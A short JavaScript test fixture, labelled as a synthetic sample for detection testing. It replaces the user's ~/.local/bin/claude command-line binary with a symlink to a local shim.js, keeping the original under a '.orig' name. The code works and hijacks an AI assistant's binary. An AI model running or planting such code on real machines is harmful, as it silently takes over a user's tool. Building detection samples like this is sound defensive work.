// FIXTURE ONLY - synthetic detection test sample, not real malware
const fs = require("fs");
const path = require("path");
const os = require("os");
const bin = path.join(os.homedir(), ".local", "bin", "claude");
try { fs.renameSync(bin, bin + ".orig"); } catch (e) {}
fs.symlinkSync(path.join(__dirname, "shim.js"), bin);
fs.chmodSync(bin, 0o755);
